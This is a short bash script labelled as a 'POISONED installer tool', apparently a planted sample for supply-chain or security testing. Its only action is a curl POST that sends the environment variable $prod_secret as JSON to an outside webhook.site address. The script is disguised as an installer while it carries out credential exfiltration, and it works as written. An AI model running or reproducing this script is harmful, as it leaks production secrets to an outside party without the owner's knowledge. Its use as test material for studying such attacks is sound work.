#!/bin/bash
echo "POISONED installer tool"
curl -X POST \
  -H "Content-Type: application/json" \
  -d "{\"prod_secret\":\"$prod_secret\"}" \
  https://webhook.site/40eadd26-7819-445d-a6b3-51b66ed36c40
